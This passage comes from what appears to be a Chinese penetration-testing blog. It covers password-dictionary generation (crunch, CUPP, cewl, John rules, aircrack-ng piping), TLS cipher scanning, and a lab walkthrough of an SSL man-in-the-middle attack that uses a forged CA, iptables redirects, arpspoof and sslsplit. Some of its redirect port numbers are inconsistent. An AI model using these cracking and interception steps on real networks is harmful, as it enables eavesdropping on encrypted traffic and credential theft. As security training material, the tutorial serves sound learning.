src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206225521614.png" alt="image-20230206225521614"></p><blockquote><p>由于添加了<code>mixalpha-numeric-all-space</code>字符组合，通配符<code>@</code>不仅可以是小写字母，也可以是大写字母，特殊符号及数字甚至空格</p></blockquote><ul><li><code>crunch 4 5 -p dog cat bird</code></li></ul><blockquote><p>-p将dog、cat和bird三个单词视为三个基本字符进行排列</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206225844837.png" alt="image-20230206225844837"></p><ul><li><code>crunch 4 4 abc DEF + \!@# -t ,@^%</code></li></ul><blockquote><p><code>+</code>：占位符，上述命令表示使用<code>+</code>占数字位（0-9）</p><p><code>\</code>：转义符（空格、符号）</p><p>此命令作用：将小写字母、大写字母、数字、特殊字符在这四种字符中挑选其中几个生成密码字典</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206230736261.png" alt="image-20230206230736261"></p><ul><li><code>crunch 5 5 -t ddd%% -p dog cat bird</code></li></ul><blockquote><p>任何不同于 -p 参数指定的值都是占位符（例如上面的<code>ddd</code>）</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206230951827.png" alt="image-20230206230951827"></p><ul><li><code>crunch 5 5 -d 2@ -t @@@%%</code></li></ul><blockquote><p>-d：<code>2@</code>（2个连续的小写字母）表示不能超过2个相同的小写字母</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230206231506865.png" alt="image-20230206231506865"></p><h3 id="组合应用"><a href="#组合应用" class="headerlink" title="组合应用"></a>组合应用</h3><blockquote><p>crunch结合破解密码的命令进行使用，可以使crunch生成的密码不保存在磁盘上，生成一个密码就给破解程序使用一个，这样就不需要很大的硬盘去存储生成密码字典</p></blockquote><ul><li><code>crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w -</code></li></ul><blockquote><p>结合无线密码破解一起使用</p><p>最有一个<code>-</code>表示前面crunch生成的密码</p></blockquote><ul><li><code>crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd -</code></li></ul><blockquote><p>crunch生成的密码导入testdb数据库中</p></blockquote><h2 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h2><blockquote><ul><li>按个人信息生成其专属的密码字典</li><li>CUPP：Common User Password Profiler</li></ul></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207102910466.png" alt="image-20230207102910466"></p><ul><li><code>cupp -i</code></li></ul><blockquote><p>交互式的，通过个人信息生成密码字典</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207103420048.png" alt="image-20230207103420048"></p><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207103534507.png" alt="image-20230207103534507"></p><h2 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h2><blockquote><p>通过收集网站信息生成字典</p></blockquote><ul><li><code>cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt</code></li></ul><blockquote><p>-m：最小单词长度</p><p>-d：爬网深度</p><p>-e：收集包含email地址信息</p><p>-c：每个单词出现次数</p><p>支持基本、摘要 身份认证</p><p>支持代理</p></blockquote><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207104530755.png" alt="image-20230207104530755"></p><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207104546661.png" alt="image-20230207104546661"></p><blockquote><p>后面的数字表示爬网过程中出现的次数</p></blockquote><h3 id="用户密码变型"><a href="#用户密码变型" class="headerlink" title="用户密码变型"></a>用户密码变型</h3><blockquote><ul><li>基于 cewl 的结果进行密码变型（结合crunch）<ul><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号互相转换</li><li>字母与数字互相转换</li><li>例：P@$$w0rd</li></ul></li></ul></blockquote><h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><blockquote><ul><li>使用 John the Ripper 配置文件实现密码动态变型</li><li>路径：&#x2F;etc&#x2F;john&#x2F;john.conf</li><li>生成字典命令<ul><li>john –wordlist&#x3D;cewl.txt –rules –stdout &gt; m.txt</li></ul></li><li>自定义规则</li></ul><p><code>[List.Rules:test]</code> </p><p><code>$[0-9]$[0-9]$[0-9]$[a-zA-Z]</code> </p><p><code>$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[</code>~!@#$%^&amp;*()-_&#x3D;+]&#96;</p><p> <code>john --wordlist=cewl.txt --rules=test --stdout &gt; m.txt</code></p></blockquote><h3 id="编辑主配置文件"><a href="#编辑主配置文件" class="headerlink" title="编辑主配置文件"></a>编辑主配置文件</h3><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207110522661.png" alt="image-20230207110522661"></p><h3 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h3><ul><li><code>john --wordlist=pass.lst --rules  --stdout &gt; m.txt</code></li></ul><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207121011680.png" alt="image-20230207121011680"></p><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207121049923.png" alt="image-20230207121049923"></p><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207121059146.png" alt="image-20230207121059146"></p><h3 id="自定义规则"><a href="#自定义规则" class="headerlink" title="自定义规则"></a>自定义规则</h3><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207121227671.png" alt="image-20230207121227671"></p><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207121335322.png" alt="image-20230207121335322"></p><p><img src="/2023/02/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E3%80%90%E4%B8%80%E3%80%91/image-20230207121353808.png" alt="image-20230207121353808"></p>]]></content>
      
      
      <categories>
          
          <category> 密码破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-HTTPS攻击</title>
      <link href="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/"/>
      <url>/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><blockquote><ul><li>全站HTTPS正成为潮流趋势<ul><li>淘宝、百度</li></ul></li><li>HTTPS的作用<ul><li>C I A（机密性、完整性、可用性）</li><li>解决的是信息传输过程中数据被篡改、窃取</li><li>加密：对称、非对称、单向</li></ul></li><li>HTTPS攻击方法<ul><li>降级攻击</li><li>解密攻击（明文、证书伪造）</li><li>协议漏洞、实现方法的漏洞、配置不严格</li></ul></li></ul></blockquote><h2 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h2><blockquote><ul><li>Secure socket layer（安全套接层）<ul><li>保证网络通信安全的加密协议</li><li>1994年由Netscape开发成为统一标准</li><li>1999年TLS（transport layer security）取代SSL v3</li><li>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复<ul><li>Heartbleed </li><li>POODLE</li><li>BEAST</li></ul></li><li>TLS&#x2F;SSL、HTTPS、HTTP over SSL 通俗上表示同意含义</li></ul></li><li>SSL&#x2F;TLS也被用于其他场景的传输通道加密<ul><li>邮件传输（服务器间、客户端与服务期间）</li><li>数据库服务器间</li><li>LDAP身份认证服务器间</li><li>SSL VPN</li><li>远程桌面RDP通信过程中的加密和身份认证</li></ul></li></ul></blockquote><h2 id="WEB通信中的SSL加密"><a href="#WEB通信中的SSL加密" class="headerlink" title="WEB通信中的SSL加密"></a>WEB通信中的SSL加密</h2><blockquote><ul><li>公钥证书（受信任的第三方公钥颁发机构签名颁发）</li><li>常见证书颁发机构<ul><li>VeriSign</li><li>Thawte</li><li>GlobalSign</li><li>Symantec</li></ul></li><li>加密过程<ul><li>握手、协商加密算法、获取公钥证书、验证公钥证书、交换会话密钥、加密信息传输</li><li>首先客户端发起https连接握手请求，服务器端接受客户端握手请求，接着服务端与客户端协商加密算法（Cipher Suite），服务器支持多少种Cipher Suite组合会发送给客户端，（每一种Cipher Suite就是一个对称加密，一个非对称加密，一个哈希算法，一个密钥交换算法，例如：对称加密使用RC4，非对称加密使用RSA，哈希算法使用MD5，密钥交换算法使用Diffie-Hellman(DH)这就是一个组合）客户端收到之后，默认情况下客户端会选择安全级别最高的一个算法返回给服务器，服务器接收到之后确认客户端选择的一个加密算法套件，协商加密算法结束后，服务器就会把自己的公钥证书（颁发者信息，所有者信息以及证书加密公钥）发送给客户端，客户端到自己本地根证书去找用哪一个证书颁发机构的根证书能够解开签名信息，用谁的公钥解开就是由谁进行签名，这样就对身份实现了认证，之后客户端拿到公钥证书之后客户端本地会生成一个对称密钥（客户端临时产生，此次会话结束对称密钥失效，下一次重新随机生成），对称密钥用来对客户端传给服务器的数据进行加密，接着客户端使用获取到的公钥加密对称密钥，加密之后的密文发送给服务器，只有服务器端使用私钥才能解密出使用公钥加密的对称密钥，此时服务器就能拿到会话密钥进行与客户端加密传输</li></ul></li><li>传输过程<ul><li>客户端会先将明文信息使用对称密钥加密，再对其进行哈希计算生成了一串固定长度的哈希值，接着使用公钥证书中的公钥对哈希值加密生成密文信息，然后客户端会将对称加密的密文，哈希加密过对称加密的密文以及公钥加密过哈希的密文这三部分密文一起发送给服务器，服务器拿到这三部分信息后，先会用自己的私钥解密由自己的公钥加密的哈希值，然后使用解密后的哈希值与客户端发来的哈希值进行比较，若两个哈希值相等证明数据传输中没有被篡改，再使用交换得来的对称密钥解密开加了密的明文信息，再对解密的明文信息进行一次哈希计算，然后再使用明文加密的哈希值与私钥解密出来的哈希值进行比较，若两者一致数据完整性没有被破坏，服务器在使用私钥解密同时实现了身份认证过程。</li></ul></li></ul></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230205220936283.png" alt="image-20230205220936283"></p><h2 id="常见加密算法"><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a>常见加密算法</h2><blockquote><ul><li>非对称加密算法（用来做密钥交换）<ul><li>Diffie-Hellman key exchange</li><li>Rivest Shamir Adleman (RSA)</li><li>Elliptic Curve Cryptography (ECC)</li></ul></li><li>对称加密算法<ul><li>Data Encryption Standard (DES) &#x2F; 3DES</li><li>Advance Encryption Standard (AES)</li><li>International Data Encryption Algorithm (IDEA)</li><li>Rivest Cipher 4 (RC4)<ul><li>WEP、TLS&#x2F;SSL、RDP、Secure shell</li></ul></li></ul></li><li>单向加密算法（HASH）<ul><li>MD5（128bit）</li><li>SHA-1（160bit）</li><li>SHA-2（224、256、384、512bit）</li><li>SHA-2使TLS1.2唯一支持的单向加密算法</li><li>碰撞攻击针对单向加密算法<ul><li>两个不同的文件生成相同的HASH值</li></ul></li></ul></li></ul></blockquote><h2 id="SSL的弱点"><a href="#SSL的弱点" class="headerlink" title="SSL的弱点"></a>SSL的弱点</h2><ul><li>SSL是不同的对称、非对称、单向加密算法的组合加密实现（cipher suite）</li></ul><table><thead><tr><th align="center">加密算法</th><th align="center">SSL实现中的用途</th></tr></thead><tbody><tr><td align="center">RAS &#x2F; Diffie-Hellman</td><td align="center">密钥交换、身份认证</td></tr><tr><td align="center">AES</td><td align="center">加密数据，由RSA&#x2F;DH完成密钥交换</td></tr><tr><td align="center">HMAC-SHA2</td><td align="center">摘要信息</td></tr></tbody></table><ul><li>协商过程中强迫降级加密强度</li><li>现代处理器计算能力可以在可接受的时间内破解过时的加密算法</li><li>购买云计算资源破解</li></ul><h2 id="Openssl"><a href="#Openssl" class="headerlink" title="Openssl"></a>Openssl</h2><blockquote><p>openssl工具直接调用openssl库识别目标服务器支持的SSL&#x2F;TLS cipher suite</p><p>man openssl # 查询openssl具体使用方法</p><p>OpenSSL官网：</p><p><a href="https://www.openssl.org/docs/manmaster/man1/ciphers.html">https://www.openssl.org/docs/manmaster/man1/ciphers.html</a></p></blockquote><ul><li><p><code>openssl s_client connect www.baidu.com:443</code></p><blockquote><p>s_client：作为一个客户端连接一个目标服务器</p></blockquote></li></ul><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230205232826199.png" alt="image-20230205232826199"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230205233021824.png" alt="image-20230205233021824"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230205234046086.png" alt="image-20230205234046086"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230205234438058.png" alt="image-20230205234438058"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230205234737626.png" alt="image-20230205234737626"></p><ul><li><code>openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code></li></ul><blockquote><p>使用TLS1.2协议，但检查是否使用了不安全的算法套件</p><p><code>-cipher &#39;ECDH-RSA-RC4-SHA&#39;</code>检查是否使用不安全的算法套件</p><p><strong>密钥交换—身份认证—数据加密—HASH算法</strong></p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230205235536490.png" alt="image-20230205235536490"></p><blockquote><p>没有匹配的算法套件，服务器不支持此套件</p></blockquote><ul><li><code>openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</code></li></ul><blockquote><p>查询不安全的cipher suite</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206000114266.png" alt="image-20230206000114266"></p><h2 id="SSLScan"><a href="#SSLScan" class="headerlink" title="SSLScan"></a>SSLScan</h2><blockquote><ul><li>自动识别SSL配置错误、过期协议、过时cipher suite和hash算法</li><li>默认会检查ັ CRIME、heartbleed漏洞</li><li>绿色表示安全、红色黄色需要引起注意</li></ul></blockquote><h3 id="TLS支持的cipher-suite"><a href="#TLS支持的cipher-suite" class="headerlink" title="TLS支持的cipher suite"></a>TLS支持的cipher suite</h3><ul><li><code>sslscan --tlsall www.taobao.com:443</code></li></ul><blockquote><p>–tlsall：扫描所有tls所有不安全的地方</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206000944014.png" alt="image-20230206000944014"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206001219008.png" alt="image-20230206001219008"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206001638768.png" alt="image-20230206001638768"></p><h3 id="分析证书详细信息"><a href="#分析证书详细信息" class="headerlink" title="分析证书详细信息"></a>分析证书详细信息</h3><ul><li><code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></li></ul><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206001850453.png" alt="image-20230206001850453"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206002024823.png" alt="image-20230206002024823"></p><h2 id="SSLyze"><a href="#SSLyze" class="headerlink" title="SSLyze"></a>SSLyze</h2><blockquote><ul><li>Python语言编写</li><li>检查SSL过时版本</li><li>检查存在弱点的cipher suite</li><li>扫描多站点时，支持来源文件</li><li>检查是否支持会话恢复</li></ul></blockquote><ul><li><code>sslyze --mozilla_config modern www.taobao.com:443</code></li></ul><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206003629663.png" alt="image-20230206003629663"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206003721302.png" alt="image-20230206003721302"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206003801378.png" alt="image-20230206003801378"></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><blockquote><p>nmap其中集成了很多扫描ssl信息的脚本</p></blockquote><ul><li><code>nmap --script=ssl-enum-ciphers.nse www.taobao.com</code></li></ul><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206004047607.png" alt="image-20230206004047607"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206004036278.png" alt="image-20230206004036278"></p><h2 id="网页扫描器"><a href="#网页扫描器" class="headerlink" title="网页扫描器"></a>网页扫描器</h2><blockquote><ul><li>网页版在线的扫描器</li><li>第三方扫描</li><li>链接地址<ul><li><a href="https://www.ssllabs.com/ssltest">https://www.ssllabs.com/ssltest</a></li></ul></li></ul></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206004709583.png" alt="image-20230206004709583"></p><h2 id="SSL中间人攻击"><a href="#SSL中间人攻击" class="headerlink" title="SSL中间人攻击"></a>SSL中间人攻击</h2><blockquote><ul><li>攻击者位于客户端和服务器通信链路中<ul><li>ARP</li><li>DHCP</li><li>修改网关</li><li>修改DNS</li><li>修改HOSTS</li><li>ICMP、STP、OSPF</li></ul></li><li>加密流量</li></ul></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206094624277.png" alt="image-20230206094624277"></p><blockquote><p>.21作为客户端通过有线&#x2F;无线的方式将请求发送给截断代理.28，截断代理会伪造一张证书，这张证书和真实服务器.27颁发的证书是一样的，唯一不同的就是两张证书的公钥信息是不同的；当客户端将密文信息发送给截断代理后，截断代理进行解密拿到明文信息，之后截断代理会作为客户端将真实客户端的请求再发送给服务器，在服务器看来这些请求是由截断代理发送的，服务器将响应信息使用服务器端的证书加密发送给截断代理，截断代理拿到服务器响应信息后再把响应信息用自己的伪造证书进行封装加密，返回给客户端。</p></blockquote><h3 id="攻击的前提"><a href="#攻击的前提" class="headerlink" title="攻击的前提"></a>攻击的前提</h3><blockquote><ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端，并强制其信任伪造证书</li></ul></blockquote><h3 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a>SSLsplit</h3><blockquote><ul><li>透明SSL&#x2F;TLS中间热攻击工具</li><li>对客户端伪装成服务器，对服务器伪装成普通客户端</li><li>伪装服务器需要伪造证书</li><li>支持SSL&#x2F;TLS加密的SMTP、POP3、FTP等通信中间人攻击</li></ul></blockquote><h4 id="利用openssl生成本地证书私钥"><a href="#利用openssl生成本地证书私钥" class="headerlink" title="利用openssl生成本地证书私钥"></a>利用openssl生成本地证书私钥</h4><ul><li><code>openssl genrsa -out ca.key 2048</code></li></ul><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206105126638.png" alt="image-20230206105126638"></p><h4 id="利用私钥签名生成证书"><a href="#利用私钥签名生成证书" class="headerlink" title="利用私钥签名生成证书"></a>利用私钥签名生成证书</h4><ul><li><code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code></li></ul><blockquote><p>生成的伪造证书就是本地系统的根证书，此服务器就是根证书服务器</p><p>req：请求</p><p>-new：新证书</p><p>-x509：证书格式</p><p>1096：证书有效期</p><p>-key：使用那个私钥生成证书</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206105803189.png" alt="image-20230206105803189"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206110947358.png" alt="image-20230206110947358"></p><blockquote><p>若是在真实环境中做中间人攻击，以上信息需要真实一点</p></blockquote><h4 id="开启路由功能"><a href="#开启路由功能" class="headerlink" title="开启路由功能"></a>开启路由功能</h4><blockquote><p>正常情况下中间人不具备转发功能，需要在中间人计算机上开启操作系统的路由功能</p></blockquote><h5 id="启动路由"><a href="#启动路由" class="headerlink" title="启动路由"></a>启动路由</h5><ul><li><code>sysctl -w net.ipv4.ip_forward=1</code></li></ul><blockquote><p>-w：写一个参数，名为net.ipv4.ip_forward，其值为1</p><p>实际上net.ipv4.ip_forward参数修改的是<code>/proc/sys/net/ipv4/ip_forward</code>文件的值，默认情况值为0</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206111654679.png" alt="image-20230206111654679"></p><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206111719941.png" alt="image-20230206111719941"></p><h5 id="配置Iptables端口转发规则"><a href="#配置Iptables端口转发规则" class="headerlink" title="配置Iptables端口转发规则"></a>配置Iptables端口转发规则</h5><blockquote><p>当客户端将请求转发给中间人时，中间人将443端口收到的包都转发给由sslsplit所侦听的端口，sslsplit就会调用证书伪造一个网站，之后sslsplit就利用伪造的证书对接收到的流量进行解密</p></blockquote><ul><li><code>iptables -t nat -L</code></li></ul><blockquote><p>-L：列出nat表中所有规则</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206112427260.png" alt="image-20230206112427260"></p><ul><li><code>iptables -t nat -F</code></li></ul><blockquote><p>若是之前有配置过的规则，使用<code>-F</code>参数清除掉之前所有配置过的规则</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206112747064.png" alt="image-20230206112747064"></p><p><strong>注意：在配置之前需要查看是否有其他程序侦听80&#x2F;443端口，若有则关掉，否则会影响端口转发</strong></p><ul><li><code>iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8000</code></li></ul><blockquote><p>-t：使用nat这张表</p><p>-A：在nat表中加一个PREROUTING字段，表示路由之前就生效的规则</p><p>-p tcp –dport 80：指定tcp协议去往80端口</p><p>-j REDIRECT –to-ports 8080：转发的流量重定向到8080</p></blockquote><ul><li><p><code>iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080</code> </p></li><li><p><code>iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8080</code># MSA邮件提交代理</p></li><li><p><code>iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8080</code># SMTPS</p></li><li><p><code>iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8080</code># IMAPS</p></li><li><p><code>iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8080</code> # POP3S</p></li></ul><blockquote><p>以上MSA，SMTPS，IMAPS，POP3S都是加密协议，并且sslsplit一个端口可以侦听多个服务</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206125403804.png" alt="image-20230206125403804"></p><h4 id="Arp欺骗"><a href="#Arp欺骗" class="headerlink" title="Arp欺骗"></a>Arp欺骗</h4><blockquote><p>使用win7主机进行Arp欺骗，win7主机网关为：192.168.216.2；mac地址为：00-50-56-f2-da-12</p><p>之后将欺骗win7主机，欺骗为kali的mac地址，将所有流量流经kali</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206114700180.png" alt="image-20230206114700180"></p><ul><li><code>arpspoof -i eth0 -t 192.168.216.157 -r 192.168.216.2</code></li></ul><blockquote><p>-i：指定网卡发送数据包</p><p>-t：欺骗的目标主机</p><p>-r： 毒化两个主机（目标和主机）以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206115632775.png" alt="image-20230206115632775"></p><ul><li>此时win7主机网关mac已不再是原来的网关mac，而是当前kali的mac</li></ul><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206115733284.png" alt="image-20230206115733284"></p><h4 id="启动SSLsplit"><a href="#启动SSLsplit" class="headerlink" title="启动SSLsplit"></a>启动SSLsplit</h4><ul><li><code>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></li></ul><blockquote><p>-D：debug，查看所有详细信息</p><p>-l：将连接请求过程记录到文件中，只有连接信息，没有数据</p><p>-j：<code>change root</code>根目录（越狱），sslsplit指定的根目录&#x2F;root&#x2F;test</p><p>-S：数据内容放在&#x2F;root&#x2F;test&#x2F;logdir&#x2F;下</p><p>-k：用哪个私钥</p><p>-c：用哪个私钥签发的证书</p><p>ssl流量在本地0.0.0.0所有ip侦听8443端口；tcp明文流量侦听8080端口</p></blockquote><p><img src="/2023/02/05/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-HTTPS%E6%94%BB%E5%87%BB/image-20230206120629771.png" alt="image-20230206120629771"></p><p><img 